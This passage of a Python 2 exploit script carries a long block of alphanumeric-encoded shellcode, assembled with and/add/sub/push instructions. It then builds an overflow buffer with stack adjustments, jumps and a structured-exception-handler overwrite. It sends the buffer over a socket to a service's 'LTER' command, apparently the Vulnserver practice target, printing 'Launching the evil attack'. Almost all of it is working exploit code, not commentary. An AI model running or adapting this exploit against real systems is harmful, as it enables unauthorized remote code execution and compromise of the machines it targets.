shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x16\x12\x75\x23" ## add  eax, 0x23751216
shellcode += "\x05\x26\x22\x64\x22" ## add  eax, 0x22642226
shellcode += "\x05\x14\x12\x54\x22" ## add  eax, 0x22541214
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x23\x47\x31\x33" ## add  eax, 0x33314723
shellcode += "\x05\x24\x47\x40\x33" ## add  eax, 0x33404724
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x06\x16\x37\x61" ## add  eax, 0x61371606
shellcode += "\x05\x05\x05\x26\x60" ## add  eax, 0x60260505
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x63\x61\x17\x14" ## add  eax, 0x14176163
shellcode += "\x05\x63\x62\x16\x14" ## add  eax, 0x14166263
shellcode += "\x05\x42\x41\x15\x13" ## add  eax, 0x13154142
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x13\x56\x67\x66" ## add  eax, 0x66675613
shellcode += "\x05\x02\x46\x67\x66" ## add  eax, 0x66674602
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x63\x37\x66\x66" ## add  eax, 0x66663763
shellcode += "\x05\x53\x26\x55\x56" ## add  eax, 0x56552653
shellcode += "\x05\x43\x25\x64\x64" ## add  eax, 0x64642543
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x33\x36\x37\x37" ## add  eax, 0x37373633
shellcode += "\x05\x22\x35\x36\x36" ## add  eax, 0x36363522
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x67\x16\x32\x36" ## add  eax, 0x36321667
shellcode += "\x05\x66\x15\x21\x35" ## add  eax, 0x35211566
shellcode += "\x05\x45\x14\x22\x34" ## add  eax, 0x34221445
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x55\x40\x17\x76" ## add  eax, 0x76174055
shellcode += "\x05\x54\x40\x16\x65" ## add  eax, 0x65164054
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x61\x66\x63\x37" ## add  eax, 0x37636661
shellcode += "\x05\x52\x56\x53\x26" ## add  eax, 0x26535652
shellcode += "\x05\x41\x44\x32\x25" ## add  eax, 0x25324441
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x71\x43\x64\x52" ## add  eax, 0x52644371
shellcode += "\x05\x62\x43\x63\x42" ## add  eax, 0x42634362
shellcode += "\x05\x51\x33\x43\x42" ## add  eax, 0x42433351
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x61\x61\x42\x71" ## add  eax, 0x71426161
shellcode += "\x05\x52\x62\x41\x61" ## add  eax, 0x61416252
shellcode += "\x05\x31\x41\x42\x51" ## add  eax, 0x51424131
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x66\x34\x33\x61" ## add  eax, 0x61333466
shellcode += "\x05\x66\x24\x44\x60" ## add  eax, 0x60442466
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x47\x53\x43\x20" ## add  eax, 0x20435347
shellcode += "\x05\x47\x44\x44\x10" ## add  eax, 0x10444447
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x07\x02\x32\x62" ## add  eax, 0x62320207
shellcode += "\x05\x07\x01\x41\x62" ## add  eax, 0x62410107
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x66\x76\x21\x33" ## add  eax, 0x33217666
shellcode += "\x05\x55\x65\x22\x33" ## add  eax, 0x33226555
shellcode += "\x05\x66\x54\x21\x23" ## add  eax, 0x23215466
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x65\x61\x31\x42" ## add  eax, 0x42316165
shellcode += "\x05\x64\x50\x21\x41" ## add  eax, 0x41215064
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x31\x45\x73\x22" ## add  eax, 0x22734531
shellcode += "\x05\x31\x44\x73\x11" ## add  eax, 0x11734431
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x65\x13\x65\x36" ## add  eax, 0x36651365
shellcode += "\x05\x55\x12\x65\x36" ## add  eax, 0x36651255
shellcode += "\x50"                 ## push eax

#-------------------------------------------------------

buffer=thirdespadj
buffer+=shellcode
buffer+="A"*(3437-len(buffer))
buffer+=secondespadj
buffer+=secondlongjump
buffer+="A"*(3515-len(buffer))
buffer+=nseh
buffer+=seh
buffer+=firstespadj
buffer+=firstshortjump
buffer+="D"*(5000-len(buffer))

print "[*] Launching the evil attack"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.:/" + buffer)
print s.recv(1024)
s.close()

